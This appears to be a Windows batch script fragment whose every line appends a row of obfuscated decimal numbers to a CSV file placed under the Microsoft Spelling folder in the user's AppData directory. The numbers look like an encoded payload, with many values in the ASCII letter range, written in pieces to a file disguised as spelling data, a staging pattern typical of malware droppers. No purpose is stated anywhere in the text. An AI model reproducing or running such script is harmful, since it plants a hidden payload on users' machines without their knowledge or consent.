>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6548.40;68.805;115.812;111.7351;815.101;40.83;384.65;6770.484;104.814;101.597;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.2047;565.116;816.114;805.98;8777.817;116.801;0.378;101.1498;817.116;814.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.82;6120.801;115.811;117.814;99.8547;801.115;376.97;810.103;4684.817;97.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.665;116.0278;816.114;805.98;817.116;1057.801;0.468;101.698;117.0577;803.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(697.98;808.101;1845.365;116.816;114.805;98.5998;817.116;801.0;767.111;1554.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.805;115.805;98.2465;808.101;765.116;816.114;8644.805;98.817;116.801;0.1808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(665.115;815.101;809.98;2869.808;121.375;101.821;70.5519;805.108;801.65;816.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7931.814;105.498;117.816;101.1030;50.65;815.115;801.109;0804.498;108.821;84.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.2610;808.101;565.116;816.114;6889.805;98.817;116.801;0.6967;579.98;815.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.101;0502.816;101.565;116.816;114.0570;805.98;817.116;801.0;0658.765;115.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.809;98.9132;808.121;468.101;808.97;1786.821;83.805;103.810;65.9308;816.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.105;398.117;5886.816;101.30;65.815;115.5498;801.109;698.108;821.70;4204.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.801;86.801;114.8950;815.105;811.110;465.116;8996.816;114.805;98.817;116.3531;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;765.115;815.101;4705.809;98.808;121.373;110.4884;802.111;814.109;497.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1091.805;111.810;97.808;86.6051;801.114;815.105;811.110;1126.565;116.816;114.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.7191;817.116;801.0;383.97;8432.816;101.808;108.805;116.6268;801.67;811.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.114;4968.697;99.816;86.801;114.9025;815.105;811.110;565.116;3354.816;114.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.817;116.1939;801.0;365.115;815.101;0067.809;98.808;121.568;101.6465;815.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.105;812.116;3546.805;111.810;65.816;116.5293;814.105;598.117;816.101;4557.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(65.815;115.801;109.3142;598.108;821.68;801.102;2858.597;117.808;116.665;108.1673;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.97;815.65;816.116;6486.814;105.798;117.816;101.5394;30.68;801.102;597.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6306.808;116.768;108.808;73.6176;809.112;811.114;816.83;2367.801;97.814;99.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(80.8656;797.116;804.115;465.116;8852.816;114.805;98.817;116.1224;801.0;667.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.112;5088.805;108.597;116.805;111.6606;810.82;801.108;397.120;7933.597;116.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.810;115.3878;465.116;816.114;805.98;3726.817;116.801;0.565;115.2862;815.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.98;808.121;4916.780;114.811;100.817;99.4056;816.65;816.116;814.105;6203.498;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.816;101.30;65.2076;815.115;801.109;398.108;4168.821;67.811;112.821;114.5160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.103;804.116;665.116;3912.816;114.805;98.817;116.1996;801.0;467.76;783.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9325.811;109.812;108.805;97.5132;810.116;765.116;816.114;3754.805;98.817;116.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3798;680.97;814.97;809.65;0405.814;114.497;121.765;116.7605;816.114;805.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.116;9383.801;0.365;115.815;101.2747;809.98;808.121;383.105;2587.803;110.497;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.817;114.5329;801.75;801.121;565.116;1706.816;114.805;98.817;116.4722;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(365.115;815.101;6323.809;98.808;121.567;111.6231;809.112;497.110;821.65;2996.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.814;105.598;117.8240;816.101;60.82;817.110;7896.816;105.809;101.667;111.6852;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.112;497.116;805.98;8444.805;108.805;116.821;65.0583;816.116;814.105;798.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7024.816;101.60;65.800;100.5425;683.119;805.116;399.104;0702.586;97.808;117.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7184;773.110;818.97;808.105;1568.800;78.811;67.811;100.5433;801.83;819.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.99;1528.804;86.797;108.817;101.0740;30.73;810.118;697.108;6831.805;100.676;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.810;103.5363;817.97;803.101;583.119;6054.805;116.799;104.486;97.7960;808.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;673.110;9261.818;97.808;105.800;68.5936;801.98;817.103;683.119;8654.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.399;104.486;97.3838;808.117;801.0;473.110;8463.818;97.808;105.800;84.5906;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.114;803.101;816.70;7379.814;97.809;101.819;111.4810;814.107;383.119;805.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9581.599;104.586;97.808;117.7873;801.0;473.110;818.97;6539.808;105.800;68.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.7018;597.121;483.105;803.110;5563.483;119.805;116.599;104.9369;686.97;808.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;1671.773;110.818;97.808;105.0789;800.86;497.108;805.100;7590.697;116.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(82.811;111.4706;816.65;499.116;805.118;0146.816;105.801;115.583;119.2085;805.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.104;486.97;4498.808;117.801;0.673;110.3831;818.97;808.105;800.67;8836.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.799;107.484;121.9817;812.101;815.83;819.105;9127.816;99.804;86.597;108.8853;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.101;40.65;800.100;2201.366;121.812;97.815;115.7105;483.119;805.116;399.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1523.686;97.808;117.801;0.7061;373.110;818.97;808.105;2949.800;84.497;114.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.2774;816.83;819.105;816.99;6312.804;86.397;108.817;101.4675;60.115;819.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.99;8708.804;86.597;108.817;101.1393;50.84;814.121;571.101;0535.816;86.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.817;101.3880;70.118;497.108;817.101;1370.40;84.814;117.801;0.9552;803.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.95;673.115;5069.484;97.814;103.801;116.6883;369.120;801.0;816.97;8040.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.801;116.369;120.5076;801.0;819.102;599.46;0044.801;120.801;0.576;97.2811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.116;373.110;800.101;5499.820;79.802;0.565;115.3280;815.101;809.98;808.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9094.582;101.802;0.683;121.0381;815.116;801.109;646.84;8200.804;114.801;97.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.6274;810.103;70.83;821.115;5735.816;101.809;77.801;115.4649;815.97;803.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.103;1561.30;87.570;67.495;82.5257;811.111;816.78;397.109;3888.801;115.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.799;101.0212;495.87;797.114;810.105;4004.810;103.70;103.801;116.1584;595.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.87;497.114;0219.810;105.810;103.40;84.3947;811.83;816.114;805.110;8161.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.471;101.816;83.4333;816.114;805.110;803.0;5151.683;117.598;115.816;114.0141;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.110;803.0;583.119;0719.805;116.499;104.373;115.5000;477.105;815.115;805.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3285.803;0.383;121.815;116.2277;801.109;482.117;810.116;2934.805;109.801;82.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.0333;811.116;805.110;803.0;1914.683;121.815;116.801;109.6156;687.101;598.82;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.117;0491.816;105.810;103.40;83.3360;821.115;816.101;809.68;6164.814;97.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.810;103.4712;30.82;811.111;816.78;4685.397;109.801;115.812;97.9706;599.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(676.111;810.103;8235.70;82.801;102.801;114.7056;801.110;399.101;776.111;4049.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.50;82.801;115.5169;811.117;814.99;801.76;2309.811;110.803;0.778;111.3974;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(567.111;800.101;676.111;9351.810;103.50;76.497;110.8523;803.117;797.103;801.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5033.811;110.803;0.668;101.1937;398.117;803.76;811.110;0088.803;0.484;97.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.8260;801.116;670.114;697.109;8871.801;119.811;114.807;76.4176;811.110;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(478.111;9917.387;97.814;110.476;111.0566;810.103;60.78;811.76;3493.811;103.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.811;110.2649;803.0;672.101;808.112;4124.476;111.810;103.50;86.6393;497.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.100;697.116;7664.801;82.811;111.816;65.1426;599.116;805.118;816.105;9357.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.376;111.810;103.6153;30.67;804.101;399.107;8454.584;121.812;101.815;76.3439;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.110;803.0;684.97;3108.814;103.801;116.776;111.5757;810.103;40.79;817.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9586.676;111.810;103.70;76.1418;805.98;814.97;814.121;4020.676;111.810;103.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.9096;801.116;695.83;819.105;3055.816;99.804;0.765;100.3275;800.83;819.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.99;1344.804;0.499;111.809;109.7578;597.110;800.83;819.105;4691.816;99.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.582;111.5371;811.116;378.97;809.101;1119.815;112.497;99.801;83.1096;819.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.99;804.0;1072.782;101.802;101.814;101.2882;810.99;801.83;819.105;8261.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.804;0.582;101.7925;815.111;817.114;599.101;8211.483;119.805;116.599;104.7100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.78;811.67;811.100;2238.801;83.819;105.816;99.0903;804.0;476.97;810.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1699.817;97.803;101.483;119.4513;805.116;499.104;50.75;0165.801;121.770;105.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.6332;583.119;805.116;699.104;7486.60;67.811;109.809;97.2016;810.100;476.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.101;6259.383;119.805;116.399;104.3050;70.68;801.98;817.103;9658.683;119.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.399;104.0492;60.68;801.108;697.121;1237.783;105.803;110.683;119.5781;805.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(499.104;50.78;3241.811;87.397;114.810;83.9872;819.105;816.99;804.0;6262.485;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.807;110.811;119.7394;810.83;819.105;816.99;3690.804;0.378;111.808;111.9373;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.111;583.119;805.116;5258.499;104.40;72.801;108.3346;812.83;819.105;816.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8040.804;0.675;101.821;67.9228;811.110;816.97;805.110;1917.801;114.783;119.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.5536;499.104;60.83;811.117;2306.814;99.801;115.583;119.1540;805.116;599.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.67;1597.804;101.699;107.784;121.1494;812.101;815.83;819.105;0013.816;99.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.566;121.4595;812.97;815.115;483.119;8971.805;116.499;104.40;84.8038;497.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.101;816.83;5668.819;105.816;99.804;0.1437;768.101;808.105;809.105;2814.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.814;77.397;121.0711;478.111;816.83;816.97;4945.814;116.783;119.805;116.3097;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.104;50.79;817.116;1647.783;119.805;116.399;104.9961;40.76;805.98;814.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3772.814;121.783;119.805;116.8903;499.104;60.68;808.108;9558.373;109.812;111.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.4798;583.101;497.114;499.104;7424.780;97.816;104.40;112.7981;597.116;804.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.101;2610.816;95.676;101.810;103.0264;816.104;70.69;810.100;2208.815;87.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.804;0.8829;812.114;811.118;805.100;8786.801;114.815;76.811;99.7729;807.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.121;815.116;9159.801;109.646;87.811;114.6511;807.102;808.111;819.46;2543.367;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.809;112.811;110.5525;801.110;816.77;811.100;8916.801;108.30;115.801;116.4208;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(395.87;397.114;810.105;2483.810;103.676;101.818;101.6191;808.0;683.121;815.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2409.801;109.767;111.810;102.6062;805.103;817.114;497.116;9655.805;111.810;73.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.1333;816.97;808.108;50.69;0301.499;109.697;80.817;98.3301;808.105;699.75;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.121;2761.570;117.808;108.40;83.1991;804.97;814.101;800.76;2471.805;98.380;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.498;108.5143;805.99;775.101;821.70;5768.817;108.808;0.483;105.3080;808.118;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.114;808.105;2963.803;104.816;80.808;97.4035;816.102;811.114;809.80;3736.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.808;105.699;75.7403;801.121;770.117;808.108;9520.60;77.805;99.814;111.9626;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.111;802.116;680.117;6118.698;108.805;99.775;101.4433;821.70;817.108;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9324.583;105.808;118.801;114.3308;808.105;803.104;816.80;6986.817;98.808;105.499;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(75.1984;801.121;770.117;808.108;6364.60;83.821;115.816;101.8790;809.88;809.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.83;3875.821;115.816;101.809;82.1487;817.110;816.105;809.101;6504.587;105.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.811;119.7623;815.82;817.110;816.105;7975.809;101.685;73.788;97.5813;809.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.103;801.116;5656.595;73.816;101.809;0.4205;815.101;816.95;373.116;3214.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.50;83.821;115.2366;816.101;809.0;584.114;6087.805;109.30;69.810;117.6889;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.0;669.99;809.97;6085.480;117.698;108.805;99.0275;375.101;821.84;811.107;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5597.801;110.30;83.804;97.6663;814.101;800.76;805.98;3263.680;117.798;108.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.6658;775.101;821.84;811.107;5423.801;110.60;83.805;108.3966;818.101;814.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.103;6434.804;116.680;108.497;116.9102;802.111;814.109;580.117;3108.798;108.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.675;101.5750;821.84;811.107;801.110;9674.60;77.805;99.814;111.8978;815.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.116;680.117;8431.398;108.805;99.375;101.8411;821.84;811.107;801.110;9180.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.805;108.818;101.8253;814.108;805.103;804.116;8834.780;117.598;108.805;99.1768;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(675.101;821.84;811.107;9986.801;110.60;68.801;108.2437;397.121;583.105;803.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8378.70;83.821;115.816;101.9930;809.87;801.98;368.121;3490.810;97.809;105.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(68.6229;497.116;797.68;801.115;4031.805;103.810;0.577;105.6028;399.114;811.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.102;1709.816;87.801;98.468;101.4305;815.105;803.110;50.83;6378.821;115.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.809;68.7024;814.97;819.105;810.103;7228.368;101.815;105.803;110.4239;50.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.115;816.101;6520.809;68.801;115.805;103.6305;810.0;483.121;815.116;2253.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.587;101.698;69.1452;820.116;801.110;815.105;9838.811;110.815;68.801;115.6060;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.103;810.0;383.121;9261.815;116.801;109.787;101.5318;498.69;810.116;805.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8359.821;68.801;115.805;103.3361;810.0;577.97;805.110;4941.70;71.801;116.469;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(120.0880;816.101;810.115;805.111;6697.810;0.573;110.802;111.5721;814.109;697.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.111;5921.810;97.808;86.801;114.4083;815.105;811.110;50.99;4780.811;109.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.808;101.6482;814.86;801.114;815.105;4305.811;110.50;71.801;116.7830;577.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(386.101;814.115;2097.805;111.810;0.682;101.9232;809.111;818.101;470.105;1352.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.469;120.801;110.1695;816.115;805.111;810.0;3278.815;101.816;95.373;110.7380;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.108;817.100;801.68;7054.801;98.817;103.673;110.8049;802.111;814.109;397.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8866.805;111.810;0.787;70.1173;467.95;372.101;808.112;2487.395;67.811;100.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.1727;801.110;801.114;597.116;5328.805;111.810;0.383;121.4680;815.116;801.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(767.111;1459.810;102.805;103.817;114.0985;697.116;805.111;810.0;6317.683;121.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.801;109.0868;546.71;808.111;498.97;8308.808;105.822;97.816;105.3459;811.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.83;821.115;3954.816;101.809;46.482;101.2715;802.108;801.99;816.105;7515.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.70;80.814;111.3810;399.101;815.115;383.111;4722.817;114.599;101.570;105.9139;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.101;767.111;808.108;2232.801;99.816;105.811;110.1252;60.83;816.114;805.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6193.803;67.811;108.808;101.2759;799.116;805.111;810.0;0423.467;111.809;112.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.9051;801.114;669.114;814.111;7244.814;67.811;108.808;101.4785;799.116;805.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;8329.678;111.816;83.817;112.2720;812.111;814.116;801.100;3165.469;120.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.812;116.5760;805.111;810.0;465.112;7035.812;108.805;99.797;116.2555;805.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.69;820.99;5215.801;112.816;105.811;110.3549;50.65;814.103;817.109;0380.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.816;69.820;99.6078;801.112;816.105;811.110;4797.50;68.801;115.699;114.2131;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.112;816.105;811.110;2952.70;83.816;114.805;110.2422;803.67;811.109;812.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2076.814;105.815;111.810;0.6342;815.105;810.103;808.101;6002.816;111.810;0.778;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.4519;60.67;811.112;821.84;6208.811;0.570;105.808;101.1270;373.110;802.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.67;6820.817;108.816;117.814;101.4843;573.110;802.111;70.70;7695.805;108.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.821;115.0627;816.101;809.73;810.102;3135.811;0.477;105.599;114.7412;811.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.102;816.86;7476.805;115.817;97.808;83.8972;816.117;800.105;811.0;5424.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.60;83.821;115.9591;816.101;809.82;817.110;7299.816;105.809;101.583;101.1587;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.105;797.108;805.122;2704.497;116.805;111.810;70.2687;811.114;809.97;816.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6704.801;114.815;83.811;97.3444;812.0;780.114;805.110;9776.816;72.801;108.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1313;577.105;499.114;811.115;0055.811;102.816;46.467;83.7354;804.97;814.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.83;0012.821;115.816;101.809;78.2109;801.116;472.116;816.112;0306.60;67.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.797;114.6962;40.68;805.114;801.99;7734.816;111.814;121.483;101.6794;812.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.97;816.111;1918.814;67.804;97.814;0.8491;468.97;805.108;821.66;7249.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.808;100.478;117.5727;809.98;801.114;60.80;0029.814;105.810;116.772;101.9738;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(597.100;801.114;60.71;2056.801;116.576;111.597;100.5613;801.114;70.108;811.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1787.800;101.814;0.573;83.8470;801.114;818.105;699.101;2076.780;114.811;118.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.5039;801.114;40.115;801.114;4021.818;105.499;101.780;114.0978;811.118;805.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.114;8164.40;86.766;67.811;100.9220;801.80;814.111;818.105;0137.800;101.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.767;83.5645;804.97;814.112;367.111;7827.800;101.680;114.811;118.5349;805.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.114;60.86;5869.574;83.804;97.814;112.0064;767.111;800.101;680.114;3359.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(118.805;100.801;114.9021;60.71;801.116;567.111;3394.800;101.368;111.809;80.8846;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.111;818.105;800.101;3293.814;0.573;70.811;114.9855;809.97;816.80;814.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9700.818;105.800;101.814;0.3616;683.116;814.105;810.103;5075.566;117.805;108.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.3902;814.0;482.101;815.111;5688.817;114.399;101.477;97.1174;810.97;803.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;1511.583;121.815;116.801;109.2992;646.87;811.114;807.102;3189.808;111.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.467;111.0287;809.112;811.110;801.110;3764.816;77.811;100.801;108.1354;646.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.109;812.105;2000.808;101.814;0.583;121.8431;815.116;801.109;546.67;3854.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.801;68.811;109.7696;746.67;811.109;812.105;2336.808;101.814;0.677;105.4591;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.114;811.115;811.102;5466.816;46.487;111.814;107.2522;802.108;811.119;746.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4944.811;109.812;105.808;101.9754;814.0;787.111;814.107;9462.802;108.811;119.667;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.4061;809.109;597.110;800.76;2615.805;110.801;67.811;109.1837;812.105;808.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;4353.487;111.814;107.802;108.9716;811.119;467.111;809.112;1572.805;108.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.30;77.0155;805.99;814.111;815.111;9986.802;116.786;83.368;101.9876;815.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.110;801.114;8864.40;75.801;121.467;111.9482;810.116;397.105;810.101;2946.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.667;111.809;109.3135;697.110;800.76;805.110;7887.801;80.797;114.815;101.3736;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;369.110;816.101;0236.814;0.377;105.815;115.1945;805.110;803.70;805.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5189.801;83.812;101.599;105.9451;802.105;699.97;816.105;2783.811;110.469;114.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.9810;814.0;767.111;809.112;3944.805;108.801;114.469;114.5808;814.111;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(473.69;9468.810;117.809;101.814;97.7277;816.111;814.0;683.116;5013.814;105.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.769;110.5512;817.109;801.114;597.116;9511.811;114.40;71.801;116.8582;469.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.109;801.114;4804.797;116.811;114.50;65.6850;499.116;805.118;397.116;6094.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.70;46.799;116.3737;811.114;60.46;699.99;8683.816;111.814;0.677;111.3215;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.105;816.111;814.0;6591.366;117.805;108.800;82.8514;801.118;805.115;805.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5432.810;83.816;114.40;68.0190;597.105;808.121;366.117;9164.805;108.800;78.817;
